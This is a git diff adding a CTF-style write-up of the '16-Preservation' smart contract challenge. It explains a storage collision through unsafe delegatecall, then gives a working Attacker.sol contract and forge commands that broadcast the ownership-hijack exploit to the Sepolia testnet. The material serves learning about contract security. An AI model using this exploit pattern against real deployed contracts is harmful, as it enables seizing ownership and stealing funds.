@@ -303,6 +303,77 @@ Since the lock logic only validates `msg.sender`, the transfer succeeds while mo
 
 ### Execution
 1. Deploy the `Attacker` contract, approve the allowance, and execute the payload:
-2. ```bash
+```bash
 forge script script/15-NaughtCoin.s.sol:DeployAttacker --rpc-url $SEPOLIA_RPC_URL --broadcast
 ```
+
+## 16-Preservation
+**Difficulty:** 4/5
+**Vulnerability:** Storage Collision via Unsafe `delegatecall`
+
+### Analysis
+The `Preservation` contract uses `delegatecall` to execute code from external library contracts:
+```javascript
+timeZone1Library.delegatecall(
+    abi.encodePacked(setTimeSignature, _timeStamp)
+);
+```
+`delegatecall` executes the callee's code using the caller's storage context. The library assumes it writes to its own `storedTime` variable at storage slot `0`, but during `delegatecall`, it actually writes to slot `0` of `Preservation`.
+
+### Preservation Storage Layout         
+
+| Slot | Variable |
+|------|-----------|
+| 0 | `timeZone1Library` |
+| 1 | `timeZone2Library` |
+| 2 | `owner` |
+| 3 | `storedTime` |
+
+### LibraryContract Storage Layout
+
+| Slot | Variable |
+|------|-----------|
+| 0 | `storedTime` |
+
+### Exploit Path
+1. Call `setFirstTime(uint256(uint160(address(attackerContract))))`. This overwrites timeZone1Library with the attacker's contract address.
+2. Call `setFirstTime()` again. Since `timeZone1Library` now points to the malicious contract, delegatecall executes:
+ ```javascript
+ function setTime(uint256) public {
+    owner = tx.origin;
+ }
+ ```
+ The attacker contract mirrors the target's storage layout so that `owner` maps to slot `2`, overwriting `Preservation.owner`.
+<details>
+<summary>Attacker.sol</summary>
+
+```javascript
+contract Attacker {
+    address public temporary1; // slot 0
+    address public temporary2; // slot 1
+    address public owner; // slot 2
+    
+    function setTime(uint256) public {
+        owner = tx.origin;
+    }
+
+    function getOwner() public view returns (address) {
+        return owner;
+    }
+}
+
+```
+</details>
+
+### Execution
+1. Deploy the `Attacker` Contract:
+```bash
+forge script script/16-Preservation.s.sol:DeployAttacker --rpc-url $SEPOLIA_RPC_URL --broadcast
+```
+2. Execute the exploit path
+```bash
+forge script script/16-Preservation.s.sol:DeployAttack --rpc-url $SEPOLIA_RPC_URL --broadcast
+```
+
+
+   
